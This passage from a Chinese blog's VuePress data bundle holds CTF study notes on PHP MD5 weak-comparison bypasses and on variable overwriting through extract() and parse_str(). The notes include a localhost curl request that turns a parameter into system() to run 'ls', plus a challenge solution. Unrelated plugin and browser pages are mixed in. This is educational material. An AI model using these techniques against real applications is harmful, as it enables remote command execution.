Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-04-CTFLearn.html",relativePath:"views/numerology/2024-12-04-CTFLearn.md",key:"v-5904bac2",path:"/views/numerology/2024-12-04-CTFLearn.html",excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第19天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:null,content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第19天\n\n\n\n\n\n\n\n * 视频地址【传送门】\n\n\n# 第1章：内容已丢失 请重新整理",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第19天\n\n\n\n\n\n\n\n * 视频地址【传送门】\n\n\n# 第1章：内容已丢失 请重新整理",charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"20241206CTF学习笔记3",frontmatter:{title:"20241206CTF学习笔记3",date:"2024-12-06T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-06-CTFLearn.html",relativePath:"views/numerology/2024-12-06-CTFLearn.md",key:"v-5f6439c6",path:"/views/numerology/2024-12-06-CTFLearn.html",headers:[{level:3,title:"eg1：",slug:"eg1",normalizedTitle:"eg1：",charIndex:43},{level:3,title:"eg2：",slug:"eg2",normalizedTitle:"eg2：",charIndex:51},{level:3,title:"之前出过类似的题：",slug:"之前出过类似的题",normalizedTitle:"之前出过类似的题：",charIndex:59},{level:3,title:"eg3：",slug:"eg3",normalizedTitle:"eg3：",charIndex:72},{level:3,title:"eg4：",slug:"eg4",normalizedTitle:"eg4：",charIndex:80}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第21天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"eg1： eg2： 之前出过类似的题： eg3： eg4：",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第21天\n\n\n\n * eg1：\n * eg2：\n * 之前出过类似的题：\n * eg3：\n * eg4：\n\n\n\n * 视频地址【传送门】\n\n\n# 第3章：web基础题-02-哈希(MD5)绕过\n\n哈希问题就是弱类型问题的延伸\n\n\n# eg1：\n\n$a != $b\nMd5($a) == Md5($b)\n\n\n1\n2\n\n\n可以解决的思路：数组、哈希碰撞\n\n下面介绍最基础的办法：\n\n我们在弱类型里，科学计数法的形式的弱类型比较就能符合条件\n\nvar_dump("0e123456"=="0e456789");//ture\n\n\n1\n\n\n我们可以找到科学计数法形式的md5值，就能让$a和$b的md5相等\n\n这里有别的博主总结的转化为md5后的值是科学计数法形式的字符【0e开头的md5】\n\n\n# eg2：\n\n$a != $b\nMd5($a) === Md5($b)\n\n\n1\n2\n\n\n下面我们用数组的办法，让它符合条件，我们尝试生成一个md5值，先随便输入一个字符串\n\n\n\n如果我们这时把这个md5函数的值给它一个数组，报的提示是我希望给我一个string，而不是一个数组，而且只是一个Warning警告，然后返回了一个NULL\n\n\n\nvar_dump(md5(array(0=>\'abc\')))\n\nWarning: md5() expects parameter 1 to be string, array given in /box/script.php on line 2\nNULL\n\n\n1\n2\n3\n4\n\n\nvar_dump(md5(array(0=>\'def\')))\n\nWarning: md5() expects parameter 1 to be string, array given in /box/script.php on line 2\nNULL\n\n\n1\n2\n3\n4\n\n\n我们可以判断以上两个值，他们都是NULL，就是强相等的。\n\n下一个问题，我们怎么把数组给到$a，比如我们写以下的get方法\n\nvar_dump($_GET[\'a\']));\n\n\n1\n\n\n我们可以在GET传入的时候，需要用以下方式，在a后边加一个中括号，就能将格式转成数组\n\n127.0.0.1:20080/test.php?a[]=asdfgghkhjk\n\n\n1\n\n\n如果数组中有多个元素，我们可以用以下方式传参，最后就会是一个数组里有多个值\n\n127.0.0.1:20080/test.php?a[]=a1&a[]=a2&a[]=a3\n\narray(3) {\n  [0]=>string(2) "a1"\n  [1]=>string(2) "a2"\n  [2]=>string(2) "a3"\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n如果我们想改键的值，可以直接在中括号里写字，就能直接改键的值\n\n127.0.0.1:20080/test.php?a[x]=a1&a[y]=a2&a[z]=a3\n\narray(3) {\n  [x]=>string(2) "a1"\n  [y]=>string(2) "a2"\n  [z]=>string(2) "a3"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 之前出过类似的题：\n\n 1. 通过URL传一个$a 是数组\n 2. 检查$a[0]和$a[1] 很严格的过滤\n 3. 去$a数组的钱两个元素做拼接 执行危险命令\n\n我们的解决办法是\n\n?a[3]=命令注入的payload&a[4]=payload&a[0]=正常&a[1]=正常\n\n举个例子，我们怎么传入顺序参数，这个数组就是什么顺序，就能绕过$a[0]和$a[1]的检查，我们的$a[0]和$a[1]都是很正常的东西，而我们前两个元素才是我们拼接的危险命令\n127.0.0.1:20080/test.php?a[3]=a1&a[4]=a2&a[0]=a3&a[1]=a4\narray(3) {\n  [3]=>string(2) "a1"\n  [4]=>string(2) "a2"\n  [0]=>string(2) "a3"\n  [1]=>string(2) "a4"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# eg3：\n\n(string)$a != (string)$b\nMd5($a) === Md5($b)\n\n\n1\n2\n\n\n思路：Md5碰撞【Md5碰撞 两个不相同的东西拥有相同的md5】\n\n有时间可以看一下这个，做一下知识储备，尤其是在内网比赛环境，不允许访问外网的话，就需要脚本跑出来相同md5的值【脚本跑md5】\n\n\n# eg4：\n\n$md5==md5($md5)\n\n解法思路：需要一个md5和md5(md5)都是0e开头\n\n$md5=$_GET[\'md5\']\nif ($md5==md5($md5))\n不要被他迷惑了，换一个参数名即可\n$a=$_GET[\'a\']\nif ($a==md5($a))\n我们只需要准备一个0e的值，然后他的md5也是0e的\n    \ns878926199a\t0e545993274517709034328855841020\ns155964671a\t0e342768416822451524974117254469\ns214587387a\t0e848240448830537924465865611904\ns214587387a\t0e848240448830537924465865611904\ns878926199a\t0e545993274517709034328855841020\ns1091221200a\t0e940624217856561557816327384675\ns1885207154a\t0e509367213418206700842008763514\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第21天\n\n\n\n * eg1：\n * eg2：\n * 之前出过类似的题：\n * eg3：\n * eg4：\n\n\n\n * 视频地址【传送门】\n\n\n# 第3章：web基础题-02-哈希(md5)绕过\n\n哈希问题就是弱类型问题的延伸\n\n\n# eg1：\n\n$a != $b\nmd5($a) == md5($b)\n\n\n1\n2\n\n\n可以解决的思路：数组、哈希碰撞\n\n下面介绍最基础的办法：\n\n我们在弱类型里，科学计数法的形式的弱类型比较就能符合条件\n\nvar_dump("0e123456"=="0e456789");//ture\n\n\n1\n\n\n我们可以找到科学计数法形式的md5值，就能让$a和$b的md5相等\n\n这里有别的博主总结的转化为md5后的值是科学计数法形式的字符【0e开头的md5】\n\n\n# eg2：\n\n$a != $b\nmd5($a) === md5($b)\n\n\n1\n2\n\n\n下面我们用数组的办法，让它符合条件，我们尝试生成一个md5值，先随便输入一个字符串\n\n\n\n如果我们这时把这个md5函数的值给它一个数组，报的提示是我希望给我一个string，而不是一个数组，而且只是一个warning警告，然后返回了一个null\n\n\n\nvar_dump(md5(array(0=>\'abc\')))\n\nwarning: md5() expects parameter 1 to be string, array given in /box/script.php on line 2\nnull\n\n\n1\n2\n3\n4\n\n\nvar_dump(md5(array(0=>\'def\')))\n\nwarning: md5() expects parameter 1 to be string, array given in /box/script.php on line 2\nnull\n\n\n1\n2\n3\n4\n\n\n我们可以判断以上两个值，他们都是null，就是强相等的。\n\n下一个问题，我们怎么把数组给到$a，比如我们写以下的get方法\n\nvar_dump($_get[\'a\']));\n\n\n1\n\n\n我们可以在get传入的时候，需要用以下方式，在a后边加一个中括号，就能将格式转成数组\n\n127.0.0.1:20080/test.php?a[]=asdfgghkhjk\n\n\n1\n\n\n如果数组中有多个元素，我们可以用以下方式传参，最后就会是一个数组里有多个值\n\n127.0.0.1:20080/test.php?a[]=a1&a[]=a2&a[]=a3\n\narray(3) {\n  [0]=>string(2) "a1"\n  [1]=>string(2) "a2"\n  [2]=>string(2) "a3"\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n如果我们想改键的值，可以直接在中括号里写字，就能直接改键的值\n\n127.0.0.1:20080/test.php?a[x]=a1&a[y]=a2&a[z]=a3\n\narray(3) {\n  [x]=>string(2) "a1"\n  [y]=>string(2) "a2"\n  [z]=>string(2) "a3"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 之前出过类似的题：\n\n 1. 通过url传一个$a 是数组\n 2. 检查$a[0]和$a[1] 很严格的过滤\n 3. 去$a数组的钱两个元素做拼接 执行危险命令\n\n我们的解决办法是\n\n?a[3]=命令注入的payload&a[4]=payload&a[0]=正常&a[1]=正常\n\n举个例子，我们怎么传入顺序参数，这个数组就是什么顺序，就能绕过$a[0]和$a[1]的检查，我们的$a[0]和$a[1]都是很正常的东西，而我们前两个元素才是我们拼接的危险命令\n127.0.0.1:20080/test.php?a[3]=a1&a[4]=a2&a[0]=a3&a[1]=a4\narray(3) {\n  [3]=>string(2) "a1"\n  [4]=>string(2) "a2"\n  [0]=>string(2) "a3"\n  [1]=>string(2) "a4"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# eg3：\n\n(string)$a != (string)$b\nmd5($a) === md5($b)\n\n\n1\n2\n\n\n思路：md5碰撞【md5碰撞 两个不相同的东西拥有相同的md5】\n\n有时间可以看一下这个，做一下知识储备，尤其是在内网比赛环境，不允许访问外网的话，就需要脚本跑出来相同md5的值【脚本跑md5】\n\n\n# eg4：\n\n$md5==md5($md5)\n\n解法思路：需要一个md5和md5(md5)都是0e开头\n\n$md5=$_get[\'md5\']\nif ($md5==md5($md5))\n不要被他迷惑了，换一个参数名即可\n$a=$_get[\'a\']\nif ($a==md5($a))\n我们只需要准备一个0e的值，然后他的md5也是0e的\n    \ns878926199a\t0e545993274517709034328855841020\ns155964671a\t0e342768416822451524974117254469\ns214587387a\t0e848240448830537924465865611904\ns214587387a\t0e848240448830537924465865611904\ns878926199a\t0e545993274517709034328855841020\ns1091221200a\t0e940624217856561557816327384675\ns1885207154a\t0e509367213418206700842008763514\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"viaStart",frontmatter:{title:"viaStart",date:"2018-04-23T15:31:26.000Z",tags:["Via"],categories:["前端 Front-end"],isShowComments:!1},regularPath:"/views/frontend/viaStart.html",relativePath:"views/frontend/viaStart.md",key:"v-458fc58e",path:"/views/frontend/viaStart.html",headers:[{level:2,title:"via或其他浏览器的必选首页",slug:"via或其他浏览器的必选首页",normalizedTitle:"via或其他浏览器的必选首页",charIndex:3},{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:21},{level:2,title:"如何使用",slug:"如何使用",normalizedTitle:"如何使用",charIndex:27},{level:2,title:"首页如下",slug:"首页如下",normalizedTitle:"首页如下",charIndex:35}],headersStr:"via或其他浏览器的必选首页 简介 如何使用 首页如下",content:" * via或其他浏览器的必选首页\n * 简介\n * 如何使用\n * 首页如下\n\n\n\n\n# via或其他浏览器的必选首页\n\n\n# 简介\n\n * 现在的手机浏览器样式百出，功能臃肿且复杂\n * 作为极客爱好者，我只需要一个简单的浏览器，so，手机用的 Chrome + Via\n * 但Via浏览器都需要自定义，所以搞了这个HomePage来为Via增加点人性化体验\n\n\n# 如何使用\n\n * 打开via手机浏览器，找到设置\n\n * 进入设置后，找到为浏览器设置主页的地方\n\n * 点击设定主页为特定网页，输入如下地址即可：\n   \n   > http://zpj80231.gitee.io/viastart\n\n * 如果你喜欢的话还可以为你自己的浏览器（手机电脑都OK哟）设置为这个主页！o(￣▽￣)ブ\n\n\n# 首页如下\n\n",normalizedContent:" * via或其他浏览器的必选首页\n * 简介\n * 如何使用\n * 首页如下\n\n\n\n\n# via或其他浏览器的必选首页\n\n\n# 简介\n\n * 现在的手机浏览器样式百出，功能臃肿且复杂\n * 作为极客爱好者，我只需要一个简单的浏览器，so，手机用的 chrome + via\n * 但via浏览器都需要自定义，所以搞了这个homepage来为via增加点人性化体验\n\n\n# 如何使用\n\n * 打开via手机浏览器，找到设置\n\n * 进入设置后，找到为浏览器设置主页的地方\n\n * 点击设定主页为特定网页，输入如下地址即可：\n   \n   > http://zpj80231.gitee.io/viastart\n\n * 如果你喜欢的话还可以为你自己的浏览器（手机电脑都ok哟）设置为这个主页！o(￣▽￣)ブ\n\n\n# 首页如下\n\n",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"20241207CTF学习笔记4",frontmatter:{title:"20241207CTF学习笔记4",date:"2024-12-07T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-07-CTFLearn.html",relativePath:"views/numerology/2024-12-07-CTFLearn.md",key:"v-3ad80d70",path:"/views/numerology/2024-12-07-CTFLearn.html",headers:[{level:3,title:"变量覆盖：",slug:"变量覆盖",normalizedTitle:"变量覆盖：",charIndex:43},{level:4,title:"定义：用传参的值替换原有变量的值",slug:"定义-用传参的值替换原有变量的值",normalizedTitle:"定义：用传参的值替换原有变量的值",charIndex:null},{level:4,title:"举例：",slug:"举例",normalizedTitle:"举例：",charIndex:175},{level:3,title:"Extract()函数：",slug:"extract-函数",normalizedTitle:"extract()函数：",charIndex:52},{level:4,title:"定义：",slug:"定义",normalizedTitle:"定义：",charIndex:153},{level:4,title:"入侵示例：",slug:"入侵示例",normalizedTitle:"入侵示例：",charIndex:448},{level:4,title:"入侵示例解释：",slug:"入侵示例解释",normalizedTitle:"入侵示例解释：",charIndex:639},{level:3,title:"Parse_str()函数：",slug:"parse-str-函数",normalizedTitle:"parse_str()函数：",charIndex:68},{level:4,title:"定义：",slug:"定义-2",normalizedTitle:"定义：",charIndex:153},{level:4,title:"方法举例：",slug:"方法举例",normalizedTitle:"方法举例：",charIndex:864},{level:4,title:"入侵示例：",slug:"入侵示例-2",normalizedTitle:"入侵示例：",charIndex:448},{level:4,title:"入侵示例解释：",slug:"入侵示例解释-2",normalizedTitle:"入侵示例解释：",charIndex:639},{level:3,title:"结论：",slug:"结论",normalizedTitle:"结论：",charIndex:86},{level:3,title:"综合题",slug:"综合题",normalizedTitle:"综合题",charIndex:93}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第22天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"变量覆盖： 定义：用传参的值替换原有变量的值 举例： Extract()函数： 定义： 入侵示例： 入侵示例解释： Parse_str()函数： 定义： 方法举例： 入侵示例： 入侵示例解释： 结论： 综合题",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第22天\n\n\n\n * 变量覆盖：\n * Extract()函数：\n * Parse_str()函数：\n * 结论：\n * 综合题\n\n\n\n * 视频地址【传送门】\n\n\n# 第4章：web基础题-03-变量覆盖问题\n\n\n# 变量覆盖：\n\n# **定义：**用传参的值替换原有变量的值\n\n# 举例：\n\n<?php\n$a=\"abc\";\n$a=\"def\";\necho($a);\n?>\n\n\n1\n2\n3\n4\n5\n\n\n变量覆盖常考的三个函数：\n\n 1. Extract() 最重要\n 2. Parse_str()\n 3. Import_requests_variables()//deprecated(弃用) in php>=5.4.0\n\n\n# Extract()函数：\n\n\n\n# 定义：\n\n将数组的键做为变量，将数组的值作为变量的值\n\n图中这里就是用Cat覆盖掉了Original，我们Extract()函数的本质是为了开发，只是演变歪了\n\n# 入侵示例：\n\n<?php\n$arr = $_GET['arr'];\nextract($arr);\nvar_dump($d);\n@$d($_POST['a']);\n?>\n\n\n1\n2\n3\n4\n5\n6\n\n\n//此时我们发送请求\ncurl http://127.0.0.1:8088/test.php?arr[d]=system\n-X POST -d \"a=ls\"\n\n\n1\n2\n3\n\n\n# 入侵示例解释：\n\n我们传入的arr[d]=system，在给到extract()函数以后，生成了一个$d的变量，变量的值是system，此时用var_dump()函数，它应该会显示string 'system' (length=6)等信息，走到下一行，@system执行外部命令，用的是POST方法传入的参数a，a的值可以是linux命令，比如ls、cat等。\n\n\n# Parse_str()函数：\n\n# 定义：\n\n把查询字符串解析到变量中。\n\n# 方法举例：\n\n<?php\nparse_str(\"name=Bill&age=60\");\necho $name.\"<br>\";\necho $age;\n?>\n\n\n1\n2\n3\n4\n5\n\n\n<?php\nparse_str(\"name=Bill&age=60\",$myArray);\nprint_r($myArray);\n?>\n\n\n1\n2\n3\n4\n\n\n# 入侵示例：\n\n对php版本有要求，视频中用的是php5\n\n<?php\n$arr = $_GET['arr'];\nparse_str($arr);\nvar_dump($d);\n@$d($_POST['a']);\n?>\n\n\n1\n2\n3\n4\n5\n6\n\n\n//此时我们发送请求\ncurl http://127.0.0.1:8088/test.php?arr=d=system\n-X POST -d \"a=ls\"\n\n\n1\n2\n3\n\n\n# 入侵示例解释：\n\n我们传入的arr=d=system，在给到parse_str()函数以后，生成了一个$d的变量，变量的值是system，此时用var_dump()函数，它应该会显示string 'system' (length=6)等信息，走到下一行，@system执行外部命令，用的是POST方法传入的参数a，a的值可以是linux命令，比如ls、cat等。\n\n\n# 结论：\n\n变量覆盖不管是用extract()函数还是parse_str()函数，变量覆盖或者是创建变量本身都没有安全风险，但后续的代码有部分危险操作，所以导致了整个的风险\n\n\n# 综合题\n\n题目源代码：\n\n<?php\nif(!lisset($_GET['id'])){\n\tshow_source(__FILE__);\n\tdie;\n}\ninclude_once('flag.php');\n$a='TESTCTF';\n$id=$_GET['id'];\n@parse_str($id);\nif($a[0]!='QNKCDZ0' && md5($a[0]) == md5('QNKCDZ0')){\n\tdie($flag);\n}else{\n\tdie('emmm');\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n我们需要传入以下参数\n\n//首先，我们看看md5('QNKCDZ0')的值，发现是个科学计数法的形式，我们需要让md5($a[0])也是一个科学计数法的形式，就能让他两弱等于\n//其次，我们看到@parse_str($id);需要我们理解parse_str的用法，传入一个a=b的形式，同时把a替换为a[0]，把b替换为s878926199a，让它满足a[0]不是QNKCDZ0且md5相等的条件\n\n?id=a[0]=s878926199a\n\n\n1\n2\n3\n4\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第22天\n\n\n\n * 变量覆盖：\n * extract()函数：\n * parse_str()函数：\n * 结论：\n * 综合题\n\n\n\n * 视频地址【传送门】\n\n\n# 第4章：web基础题-03-变量覆盖问题\n\n\n# 变量覆盖：\n\n# **定义：**用传参的值替换原有变量的值\n\n# 举例：\n\n<?php\n$a=\"abc\";\n$a=\"def\";\necho($a);\n?>\n\n\n1\n2\n3\n4\n5\n\n\n变量覆盖常考的三个函数：\n\n 1. extract() 最重要\n 2. parse_str()\n 3. import_requests_variables()//deprecated(弃用) in php>=5.4.0\n\n\n# extract()函数：\n\n\n\n# 定义：\n\n将数组的键做为变量，将数组的值作为变量的值\n\n图中这里就是用cat覆盖掉了original，我们extract()函数的本质是为了开发，只是演变歪了\n\n# 入侵示例：\n\n<?php\n$arr = $_get['arr'];\nextract($arr);\nvar_dump($d);\n@$d($_post['a']);\n?>\n\n\n1\n2\n3\n4\n5\n6\n\n\n//此时我们发送请求\ncurl http://127.0.0.1:8088/test.php?arr[d]=system\n-x post -d \"a=ls\"\n\n\n1\n2\n3\n\n\n# 入侵示例解释：\n\n我们传入的arr[d]=system，在给到extract()函数以后，生成了一个$d的变量，变量的值是system，此时用var_dump()函数，它应该会显示string 'system' (length=6)等信息，走到下一行，@system执行外部命令，用的是post方法传入的参数a，a的值可以是linux命令，比如ls、cat等。\n\n\n# parse_str()函数：\n\n# 定义：\n\n把查询字符串解析到变量中。\n\n# 方法举例：\n\n<?php\nparse_str(\"name=bill&age=60\");\necho $name.\"<br>\";\necho $age;\n?>\n\n\n1\n2\n3\n4\n5\n\n\n<?php\nparse_str(\"name=bill&age=60\",$myarray);\nprint_r($myarray);\n?>\n\n\n1\n2\n3\n4\n\n\n# 入侵示例：\n\n对php版本有要求，视频中用的是php5\n\n<?php\n$arr = $_get['arr'];\nparse_str($arr);\nvar_dump($d);\n@$d($_post['a']);\n?>\n\n\n1\n2\n3\n4\n5\n6\n\n\n//此时我们发送请求\ncurl http://127.0.0.1:8088/test.php?arr=d=system\n-x post -d \"a=ls\"\n\n\n1\n2\n3\n\n\n# 入侵示例解释：\n\n我们传入的arr=d=system，在给到parse_str()函数以后，生成了一个$d的变量，变量的值是system，此时用var_dump()函数，它应该会显示string 'system' (length=6)等信息，走到下一行，@system执行外部命令，用的是post方法传入的参数a，a的值可以是linux命令，比如ls、cat等。\n\n\n# 结论：\n\n变量覆盖不管是用extract()函数还是parse_str()函数，变量覆盖或者是创建变量本身都没有安全风险，但后续的代码有部分危险操作，所以导致了整个的风险\n\n\n# 综合题\n\n题目源代码：\n\n<?php\nif(!lisset($_get['id'])){\n\tshow_source(__file__);\n\tdie;\n}\ninclude_once('flag.php');\n$a='testctf';\n$id=$_get['id'];\n@parse_str($id);\nif($a[0]!='qnkcdz0' && md5($a[0]) == md5('qnkcdz0')){\n\tdie($flag);\n}else{\n\tdie('emmm');\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n我们需要传入以下参数\n\n//首先，我们看看md5('qnkcdz0')的值，发现是个科学计数法的形式，我们需要让md5($a[0])也是一个科学计数法的形式，就能让他两弱等于\n//其次，我们看到@parse_str($id);需要我们理解parse_str的用法，传入一个a=b的形式，同时把a替换为a[0]，把b替换为s878926199a，让它满足a[0]不是qnkcdz0且md5相等的条件\n\n?id=a[0]=s878926199a\n\n\n1\n2\n3\n4\n",charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"vuepress插件：<Boxx/>",frontmatter:{title:"vuepress插件：`<Boxx/>`",date:"2019-11-17T15:53:26.000Z",tags:["vuepress"],categories:["前端 Front-end"],isShowComments:!1},regularPath:"/views/frontend/vuepress-plugin-boxx.html",relativePath:"views/frontend/vuepress-plugin-boxx.md",key:"v-425e82ee",path:"/views/frontend/vuepress-plugin-boxx.html",headers:[{level:2,title:"序言",slug:"序言",normalizedTitle:"序言",charIndex:2},{level:2,title:"安装",slug:"安装",normalizedTitle:"安装",charIndex:131},{level:2,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:63},{level:2,title:"默认样式",slug:"默认样式",normalizedTitle:"默认样式",charIndex:569},{level:2,title:"自定义标题和内容",slug:"自定义标题和内容",normalizedTitle:"自定义标题和内容",charIndex:578},{level:2,title:"自定义样式",slug:"自定义样式",normalizedTitle:"自定义样式",charIndex:786}],headersStr:"序言 安装 使用 默认样式 自定义标题和内容 自定义样式",content:'# 序言\n\n * 由于在引入默认的VuePress Custom Containers太过笨重了，故闲来无事对其做一层封装简化使用\n * Github地址：https://github.com/zpj80231/vuepress-plugin-boxx\n\n\n# 安装\n\n * 在文件package.json中的devDependencies下加入"vuepress-plugin-boxx": "0.0.7"：\n\n"devDependencies": {\n    "vuepress-plugin-boxx": "0.0.7"\n}\n\n\n1\n2\n3\n\n * 在 vuepress 的config.js中配置plugins：\n\nplugins: [\n    ["vuepress-plugin-boxx"]\n],\n\n\n1\n2\n3\n\n * 在package.json目录下执行命令：npm install\n * 正常启动项目，接着如下使用即可\n\n\n# 使用\n\n * 引入：只需在你想要插入的地方加入 <Boxx/> 即可（如顶部所示）\n * 内容：默认随机展示名人名句，支持自定义\n * 样式：有三种样式，默认为 tip 样式，支持自定义\n * 注意：除<Boxx/>这个标签是必须外，标签属性均为可选，所有标签属性会在下文中详细介绍\n\n\n# 默认样式\n\n\n# 自定义标题和内容\n\n * 如果默认的名人名句不满足需求的话，自定义只需指定两个属性title和content的值\n\nNAME      TYPE     DESCRIPTION\ntitle     String   要展示的title的内容，支持html标签\ncontent   String   要展示的content的内容，支持html标签\n\n * 当然你也可以只输入title或content，如下：\n\n\n# 自定义样式\n\n * 可以通过以下几个属性实现\n\nNAME           TYPE     DESCRIPTION\nblockStyle     Object   整体块元素的样式\ntitleStyle     Object   只针对title的样式\ncontentStyle   Object   只针对content的样式\nchangeTime     Number   以毫秒值为单位的动态变化时间，顶部为例\n\n需要注意的是：属性值传输的对象只能通过v-bind:绑定来实现\n\n * 以下是对如上样式的示例，在Markdown中这样书写即可：\n\n<marquee>\n<Boxx :blockStyle="blockStyle"  />\n<Boxx type="warning" :blockStyle="titleStyle" :titleStyle="titleStyle" changeTime="1000" title="我是一个大大的且变化的 title"/>\n<Boxx type="danger" :blockStyle="contentStyle" :contentStyle="contentStyle" content="我是一个小小的<br><marquee>content</marquee>"/>\n</marquee>\n\n<script>\n\texport default {\n\t\tdata() {\n\t\t\treturn {\n\t\t\t\tblockStyle: {\'background\':\'#eee\',\'color\':\'red\'},\n                titleStyle: {\'margin-right\': \'10%\',\'font-size\':\'16px\'},\n                contentStyle: {\'margin-right\': \'20%\',\'font-size\':\'10px\',\n                               "margin-top": "1rem","margin-bottom": "0.4rem"},\n\t\t\t}\n\t\t}\n\t}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',normalizedContent:'# 序言\n\n * 由于在引入默认的vuepress custom containers太过笨重了，故闲来无事对其做一层封装简化使用\n * github地址：https://github.com/zpj80231/vuepress-plugin-boxx\n\n\n# 安装\n\n * 在文件package.json中的devdependencies下加入"vuepress-plugin-boxx": "0.0.7"：\n\n"devdependencies": {\n    "vuepress-plugin-boxx": "0.0.7"\n}\n\n\n1\n2\n3\n\n * 在 vuepress 的config.js中配置plugins：\n\nplugins: [\n    ["vuepress-plugin-boxx"]\n],\n\n\n1\n2\n3\n\n * 在package.json目录下执行命令：npm install\n * 正常启动项目，接着如下使用即可\n\n\n# 使用\n\n * 引入：只需在你想要插入的地方加入 <boxx/> 即可（如顶部所示）\n * 内容：默认随机展示名人名句，支持自定义\n * 样式：有三种样式，默认为 tip 样式，支持自定义\n * 注意：除<boxx/>这个标签是必须外，标签属性均为可选，所有标签属性会在下文中详细介绍\n\n\n# 默认样式\n\n\n# 自定义标题和内容\n\n * 如果默认的名人名句不满足需求的话，自定义只需指定两个属性title和content的值\n\nname      type     description\ntitle     string   要展示的title的内容，支持html标签\ncontent   string   要展示的content的内容，支持html标签\n\n * 当然你也可以只输入title或content，如下：\n\n\n# 自定义样式\n\n * 可以通过以下几个属性实现\n\nname           type     description\nblockstyle     object   整体块元素的样式\ntitlestyle     object   只针对title的样式\ncontentstyle   object   只针对content的样式\nchangetime     number   以毫秒值为单位的动态变化时间，顶部为例\n\n需要注意的是：属性值传输的对象只能通过v-bind:绑定来实现\n\n * 以下是对如上样式的示例，在markdown中这样书写即可：\n\n<marquee>\n<boxx :blockstyle="blockstyle"  />\n<boxx type="warning" :blockstyle="titlestyle" :titlestyle="titlestyle" changetime="1000" title="我是一个大大的且变化的 title"/>\n<boxx type="danger" :blockstyle="contentstyle" :contentstyle="contentstyle" content="我是一个小小的<br><marquee>content</marquee>"/>\n</marquee>\n\n<script>\n\texport default {\n\t\tdata() {\n\t\t\treturn {\n\t\t\t\tblockstyle: {\'background\':\'#eee\',\'color\':\'red\'},\n                titlestyle: {\'margin-right\': \'10%\',\'font-size\':\'16px\'},\n                contentstyle: {\'margin-right\': \'20%\',\'font-size\':\'10px\',\n                               "margin-top": "1rem","margin-bottom": "0.4rem"},\n\t\t\t}\n\t\t}\n\t}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"20241208CTF学习笔记5",frontmatter:{title:"20241208CTF学习笔记5",date:"2024-12-08T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-08-CTFLearn.html",relativePath:"views/numerology/2024-12-08-CTFLearn.md",key:"v-65c3b8ca",path:"/views/numerology/2024-12-08-CTFLearn.html",headers:[{level:3,title:"命令执行漏洞：",slug:"命令执行漏洞",normalizedTitle:"命令执行漏洞：",charIndex:43},{level:4,title:"定义和特点：",slug:"定义和特点",normalizedTitle:"定义和特点：",charIndex:132},{level:4,title:"举例：",slug:"举例",normalizedTitle:"举例：",charIndex:450},{level:3,title:"权限的应用",slug:"权限的应用",normalizedTitle:"权限的应用",charIndex:54},{level:3,title:"漏洞位点",slug:"漏洞位点",normalizedTitle:"漏洞位点",charIndex:63},{level:3,title:"漏洞利用",slug:"漏洞利用",normalizedTitle:"漏洞利用",charIndex:71}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CT